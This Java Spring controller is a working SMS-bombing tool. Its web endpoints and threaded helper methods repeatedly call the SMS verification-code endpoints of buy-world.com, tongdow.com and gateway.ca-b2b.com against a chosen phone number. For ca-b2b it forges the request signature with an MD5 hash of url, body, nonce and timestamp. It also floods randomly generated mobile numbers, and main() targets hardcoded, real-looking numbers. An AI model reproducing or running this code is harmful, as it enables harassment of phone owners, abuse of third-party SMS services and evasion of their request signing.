package com.example.demo;


import okhttp3.*;
import org.springframework.stereotype.Controller;
import org.springframework.util.DigestUtils;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import java.io.IOException;
import java.util.HashMap;
import java.util.UUID;

@Controller
@RequestMapping("test")
public class TestController {

    @RequestMapping("hello")
    @ResponseBody
    public String hello(){
        return "祥祥，我爱你";
    }

    @RequestMapping("send")
    @ResponseBody
    public String send(@RequestParam("phone") String phone,
            @RequestParam("num") Integer num,
            @RequestParam("sleep") Integer sleep) throws IOException {

        StringBuilder sb = new StringBuilder();

        for (int i=0 ; i<num ; i++) {

            OkHttpClient client = new OkHttpClient();

            Request request = new Request.Builder().url("http://www.buy-world.com/user/sendPhoneCode.do?phone="+phone).build();
            Response response = client.newCall(request).execute();
            if (response.isSuccessful()) {
                sb.append(response.body().string());
            } else {
                throw new IOException("Unexpected code " + response);
            }

            try {
                Thread.sleep(sleep);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

        }


        return "success:" + phone + "|" + num + ":" + sb.toString();
    }

    @RequestMapping("sendZF")
    @ResponseBody
    public String sendZF(@RequestParam("phone") String phone,
            @RequestParam("num") Integer num,
            @RequestParam("sleep") Integer sleep) throws IOException {

        run(phone,num,sleep);

        return "success:" + phone + "|" + num + "|" + sleep;

    }

    @RequestMapping("sendDD")
    @ResponseBody
    public String sendDD(@RequestParam("phone") String phone,
            @RequestParam("num") Integer num,
            @RequestParam("sleep") Integer sleep) throws IOException {

        StringBuilder sb = new StringBuilder();

        new Thread(new Runnable() {
            @Override
            public void run() {
                for (int i=0 ; i<num ; i++) {

                    try {
                        OkHttpClient client = new OkHttpClient();

                        Request request = new Request.Builder().url("https://www.tongdow.com/getSmsCaptcha.action?phone="+phone).build();
                        Response response = client.newCall(request).execute();
                        if (response.isSuccessful()) {
                            sb.append(response.body().string());
                        } else {
                            throw new IOException("Unexpected code " + response);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    try {
                        Thread.sleep(sleep);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                }
            }
        }).start();

        new Thread(new Runnable() {
            @Override
            public void run() {
                StringBuilder sb = new StringBuilder();

                for (int i=0 ; i<num ; i++) {

                    OkHttpClient client = new OkHttpClient();

                    Request request = new Request.Builder().url("http://www.buy-world.com/user/sendPhoneCode.do?phone="+phone).build();

                    try {Response response = client.newCall(request).execute();
                        sb.append(response.body().string());
                    } catch (IOException e) {
                        e.printStackTrace();
                    }


                    try {
                        Thread.sleep(sleep);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                }
            }
        }).start();

        run(phone,num,sleep);

        return "success:" + phone + "|" + num + ":" + sb.toString();
    }

    @RequestMapping("sendYY")
    @ResponseBody
    public String sendYY(
            @RequestParam("num") Integer num,
            @RequestParam("sleep") Integer sleep) throws IOException {

        new TestController().run(num,sleep);

        return "aa";
    }

    @RequestMapping("sendTd")
    @ResponseBody
    public String sendTd(@RequestParam("phone") String phone,
            @RequestParam("num") Integer num,
            @RequestParam("sleep") Integer sleep)  {

        StringBuilder sb = new StringBuilder();

        new Thread(new Runnable() {
            @Override
            public void run() {
                for (int i=0 ; i<num ; i++) {

                    try {
                        OkHttpClient client = new OkHttpClient();

                        Request request = new Request.Builder().url("https://www.tongdow.com/getSmsCaptcha.action?phone="+phone).build();
                        Response response = client.newCall(request).execute();
                        if (response.isSuccessful()) {
                            sb.append(response.body().string());
                        } else {
                            throw new IOException("Unexpected code " + response);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    try {
                        Thread.sleep(sleep);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                }
            }
        }).start();



        return "success:" + phone + "|" + num + ":" + sb.toString();
    }


   /* public static void main(String[] args) throws IOException {

        String token = UUID.randomUUID().toString();
        String phone = "15708431920";

        //把参数传进Map中
        HashMap<String,String> params=new HashMap<>();
        params.put("codeType","1");
        params.put("mobilePhone","+86-"+phone);
        params.put("title","Registration of ca-b2b");
        params.put("token",token);
        FormBody.Builder builder = new FormBody.Builder();
        for (String key : params.keySet()) {
            //追加表单信息
            builder.add(key, params.get(key));
        }

        String noce = UUID.randomUUID().toString().replaceAll("-","");

        String timestamp = System.currentTimeMillis() + "";

        String body = "{\"codeType\":1,\"mobilePhone\":\"+86-"+phone+"\",\"title\":\"Registration of ca-b2b\",\"token\":\""+token+"\"}";

        OkHttpClient okHttpClient=new OkHttpClient();
        //RequestBody formBody=builder.build();

        RequestBody formBody = RequestBody.create(MediaType.parse(body), body);

        Request request=new Request.Builder().url("https://gateway.ca-b2b.com/ca-user-provider/v1/source-open/reg/sendSMS")
                .addHeader("url","ca-user-provider/v1/source-open/reg/sendSMS")
                .addHeader("nonce",noce)
                .addHeader("timestamp", timestamp)
                .addHeader("sign",getSign("ca-user-provider/v1/source-open/reg/sendSMS", body,noce, timestamp))
                .addHeader("Content-Type","application/json;charset=UTF-8")
                .addHeader("Cache-Control","")

                .post(formBody).build();



        Call call=okHttpClient.newCall(request);
        call.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                //请求失败的处理
            }
            @Override
            public void onResponse(Call call, Response response) throws IOException {

                System.out.println(response.body().string());
            }
        });
    }*/

    public static void main(String[] args) throws IOException {
        //sendSMS("15708431920");

        TestController controller =  new TestController();
        //controller.runTD("17780677777", 1000, 2000);

        //controller.runGG("17780677777", 1000, 2000);
        //controller.run("17780677777", 100, 70000);

        //controller.runTD("15708431920", 1000, 2000);

       //controller.runGG("15708431920", 1000, 2000);
      controller.run("15846254785", 100, 70000);

        //controller.runTD("17780677777", 1000, 70000);
        //controller.runTD("15708431920", 1000, 70000);

        //controller.runGG("17780677777", 100, 1000);

        //controller.runGG("15708431920", 100, 1000);

/*
        controller.runTD("17780677777", 1000, 70000);

        controller.runTD("15708431920", 1000, 70000);*/

        //controller.run(10000,1);



        //controller.runTD("15708431920", 10, 1000);
    }

    public void runGG(String phone, Integer num, Integer sleep){
        new Thread(new Runnable() {
            @Override
            public void run() {
                StringBuilder sb = new StringBuilder();

                for (int i=0 ; i<num ; i++) {

                    OkHttpClient client = new OkHttpClient();

                    Request request = new Request.Builder().url("http://www.buy-world.com/user/sendPhoneCode.do?phone="+phone).build();

                    try {Response response = client.newCall(request).execute();
                        System.out.println(response.body().string());

                    } catch (IOException e) {
                        e.printStackTrace();
                    }


                    try {
                        Thread.sleep(sleep);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                }

                System.out.println(sb);
            }
        }).start();
    }


    public void runTD(String phone, Integer num, Integer sleep){
        new Thread(new Runnable() {
            @Override
            public void run() {
                for (int i=0 ; i<num ; i++) {

                    try {
                        OkHttpClient client = new OkHttpClient();

                        Request request = new Request.Builder().url("https://www.tongdow.com/getSmsCaptcha.action?phone="+phone).build();
                        Response response = client.newCall(request).execute();

                        System.out.println(response.body().string());
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    try {
                        Thread.sleep(sleep);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                }
            }
        }).start();
    }

    public  void run(String phone, Integer num, Integer sleep) throws IOException {

        new Thread(new Runnable() {
            @Override
            public void run() {
                for (int i=0 ; i<num ; i++) {

                   /* if(i%3==0 && i != 0){
                        try {
                            Thread.sleep(70000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }*/

                    String token = UUID.randomUUID().toString();

                    //把参数传进Map中
                    HashMap<String,String> params=new HashMap<>();
                    params.put("codeType","1");
                    params.put("mobilePhone","+86-"+phone);
                    params.put("title",UUID.randomUUID().toString());
                    params.put("token",token);
                    FormBody.Builder builder = new FormBody.Builder();
                    for (String key : params.keySet()) {
                        //追加表单信息
                        builder.add(key, params.get(key));
                    }


                    String noce = UUID.randomUUID().toString().replaceAll("-","");

                    String timestamp = System.currentTimeMillis() + "";

                    String body = "{\"codeType\":1,\"mobilePhone\":\"+86-"+phone+"\",\"title\":\"Registration of ca-b2b\",\"token\":\""+token+"\"}";

                    OkHttpClient okHttpClient=new OkHttpClient();

                    RequestBody formBody = RequestBody.create(MediaType.parse(body), body);

                    Request request=new Request.Builder().url("https://gateway.ca-b2b.com/ca-user-provider/v1/source-open/reg/sendSMS")
                            .addHeader("url","ca-user-provider/v1/source-open/reg/sendSMS")
                            .addHeader("nonce",noce)
                            .addHeader("timestamp", timestamp)
                            .addHeader("sign",getSign("ca-user-provider/v1/source-open/reg/sendSMS", body,noce, timestamp))
                            .addHeader("Content-Type","application/json;charset=UTF-8")
                            .post(formBody).build();



                    Call call=okHttpClient.newCall(request);
                    call.enqueue(new Callback() {
                        @Override
                        public void onFailure(Call call, IOException e) {
                            //请求失败的处理
                        }
                        @Override
                        public void onResponse(Call call, Response response) throws IOException {

                            System.out.println(response.body().string());
                        }
                    });


                        try {
                            Thread.sleep(sleep);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }

                }
            }
        }).start();


    }


    public  void runMm(String phone, Integer num, Integer sleep) throws IOException {

        new Thread(new Runnable() {
            @Override
            public void run() {
                for (int i=0 ; i<num ; i++) {

                   /* if(i%3==0 && i != 0){
                        try {
                            Thread.sleep(70000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }*/

                    String token = UUID.randomUUID().toString();

                    //把参数传进Map中
                    HashMap<String,String> params=new HashMap<>();
                    params.put("codeType","2");
                    params.put("mobilePhone","+86-"+phone);
                    params.put("title",UUID.randomUUID().toString());
                    params.put("token",token);
                    params.put("userName",phone);
                    FormBody.Builder builder = new FormBody.Builder();
                    for (String key : params.keySet()) {
                        //追加表单信息
                        builder.add(key, params.get(key));
                    }


                    String noce = UUID.randomUUID().toString().replaceAll("-","");

                    String timestamp = System.currentTimeMillis() + "";


                    String body = "{\"codeType\":2,\"mobilePhone\":\"+86-"+phone+"\",\"title\":\"找回密码\",\"token\":\""+token+"\",\"userName\":\""+phone+"\"}";

                    OkHttpClient okHttpClient=new OkHttpClient();

                    RequestBody formBody = RequestBody.create(MediaType.parse(body), body);

                    Request request=new Request.Builder().url("https://gateway.ca-b2b.com/ca-user-provider/v1/source-open/reg/sendSMS")
                            .addHeader("url","ca-user-provider/v1/source-open/reg/sendSMS")
                            .addHeader("nonce",noce)
                            .addHeader("timestamp", timestamp)
                            .addHeader("sign",getSign("ca-user-provider/v1/source-open/reg/sendSMS", body,noce, timestamp))
                            .addHeader("Content-Type","application/json;charset=UTF-8")
                            .post(formBody).build();



                    Call call=okHttpClient.newCall(request);
                    call.enqueue(new Callback() {
                        @Override
                        public void onFailure(Call call, IOException e) {
                            //请求失败的处理
                        }
                        @Override
                        public void onResponse(Call call, Response response) throws IOException {

                            System.out.println(response.body().string());
                        }
                    });


                    try {
                        Thread.sleep(sleep);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                }
            }
        }).start();


    }

    public static void sendSMS(String phone){

        String token = UUID.randomUUID().toString();


        HashMap<String,String> params=new HashMap<>();
        params.put("codeType","1");
        params.put("mobilePhone","+86-"+phone);
        params.put("title",UUID.randomUUID().toString());
        params.put("token",token);
        FormBody.Builder builder = new FormBody.Builder();
        for (String key : params.keySet()) {
            builder.add(key, params.get(key));
        }


        String noce = UUID.randomUUID().toString().replaceAll("-","");

        String timestamp = System.currentTimeMillis() + "";

        String body = "{\"codeType\":1,\"mobilePhone\":\"+86-"+phone+"\",\"title\":\"Registration of ca-b2b\",\"token\":\""+token+"\"}";

        OkHttpClient okHttpClient=new OkHttpClient();

        RequestBody formBody = RequestBody.create(MediaType.parse(body), body);

        Request request=new Request.Builder().url("https://gateway.ca-b2b.com/ca-user-provider/v1/source-open/reg/sendSMS")
                .addHeader("url","ca-user-provider/v1/source-open/reg/sendSMS")
                .addHeader("nonce",noce)
                .addHeader("timestamp", timestamp)
                .addHeader("sign",getSign("ca-user-provider/v1/source-open/reg/sendSMS", body,noce, timestamp))
                .addHeader("Content-Type","application/json;charset=UTF-8")
                .post(formBody).build();



        Call call=okHttpClient.newCall(request);
        call.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                System.out.println(e);
            }
            @Override
            public void onResponse(Call call, Response response) throws IOException {

                System.out.println(response.body().string());
            }
        });


    }

    /*public static void main(String[] args) throws IOException {

        String token = "cjq1c7i6dqg0000";//UUID.randomUUID().toString();
        String phone = "15708431920";

        //把参数传进Map中
        HashMap<String,String> params=new HashMap<>();
        params.put("codeType","1");
        params.put("mobilePhone","+86-"+phone);
        params.put("title","Registration of ca-b2b");
        params.put("token",token);
        FormBody.Builder builder = new FormBody.Builder();
        for (String key : params.keySet()) {
            //追加表单信息
            builder.add(key, params.get(key));
        }

        String noce = "75e635d7920c49aaad1f2203abfffd78";//UUID.randomUUID().toString().replaceAll("-","");

        String timestamp = "1591009996269";//System.currentTimeMillis() + "";

        String body = "{\"codeType\":1,\"mobilePhone\":\"+86-"+phone+"\",\"title\":\"Registration of ca-b2b\",\"token\":\""+token+"\"}";

        OkHttpClient okHttpClient=new OkHttpClient();
        RequestBody formBody=builder.build();
        Request request=new Request.Builder().url("https://gateway.ca-b2b.com/ca-user-provider/v1/source-open/reg/sendSMS")
                .addHeader("url","ca-user-provider/v1/source-open/reg/sendSMS")
                .addHeader("nonce",noce)
                .addHeader("timestamp", timestamp)
                .addHeader("sign",getSign("ca-user-provider/v1/source-open/reg/sendSMS", body,noce, timestamp))
                .addHeader("content-type", "application/json;charset=UTF-8")
                .post(formBody).build();



        Call call=okHttpClient.newCall(request);
        call.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                //请求失败的处理
            }
            @Override
            public void onResponse(Call call, Response response) throws IOException {

                System.out.println(response.body().string());
            }
        });

    }*/

    public  void run(Integer num, Integer sleep) throws IOException {



        new Thread(new Runnable() {
            @Override
            public void run() {
                for (int i=0 ; i<num ; i++) {

                    String phone = getTel();

                    String token = UUID.randomUUID().toString();

                    //把参数传进Map中
                    HashMap<String,String> params=new HashMap<>();
                    params.put("codeType","1");
                    params.put("mobilePhone","+86-"+phone);
                    params.put("title",UUID.randomUUID().toString());
                    params.put("token",token);
                    FormBody.Builder builder = new FormBody.Builder();
                    for (String key : params.keySet()) {
                        //追加表单信息
                        builder.add(key, params.get(key));
                    }

                    String noce = UUID.randomUUID().toString().replaceAll("-","");

                    String timestamp = System.currentTimeMillis() + "";

                    String body = "{\"codeType\":1,\"mobilePhone\":\"+86-"+phone+"\",\"title\":\"Registration of ca-b2b\",\"token\":\""+token+"\"}";

                    OkHttpClient okHttpClient=new OkHttpClient();

                    RequestBody formBody = RequestBody.create(MediaType.parse(body), body);

                    Request request=new Request.Builder().url("https://gateway.ca-b2b.com/ca-user-provider/v1/source-open/reg/sendSMS")
                            .addHeader("url","ca-user-provider/v1/source-open/reg/sendSMS")
                            .addHeader("nonce",noce)
                            .addHeader("timestamp", timestamp)
                            .addHeader("sign",getSign("ca-user-provider/v1/source-open/reg/sendSMS", body,noce, timestamp))
                            .addHeader("Content-Type","application/json;charset=UTF-8")
                            .post(formBody).build();



                    Call call=okHttpClient.newCall(request);
                    call.enqueue(new Callback() {
                        @Override
                        public void onFailure(Call call, IOException e) {
                            //请求失败的处理
                            System.out.println(e);
                        }
                        @Override
                        public void onResponse(Call call, Response response) throws IOException {

                            System.out.println(phone + "  :    " + response.body().string());
                        }
                    });



                    try {
                        Thread.sleep(sleep);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }


                }
            }
        }).start();


    }

    public static String getSign(String url, String body, String noce, String timestap){

        StringBuilder sb1 = new StringBuilder();
        sb1.append(url);
        sb1.append(body);
        sb1.append(noce);
        sb1.append(timestap);

        System.out.println(sb1.toString());
        String code = DigestUtils.md5DigestAsHex(sb1.toString().getBytes());
        System.out.println(code);

        return code;
    }

    private static String[] telFirst="133,149,153,173,177,180,181,189,199,130,131,132,145,155,156,166,171,175,176,185,186,166,134,135,136,137,138,139,147,150,151,152,157,158,159,172,178,182,183,184,187,188,198".split(",");
    private static String getTel() {
        int index=getNum(0,telFirst.length-1);
        String first=telFirst[index];
        String second=String.valueOf(getNum(1,888)+10000).substring(1);
        String third=String.valueOf(getNum(1,9100)+10000).substring(1);
        return first+second+third;
    }

    public static int getNum(int start,int end) {
        return (int)(Math.random()*(end-start+1)+start);
    }
}
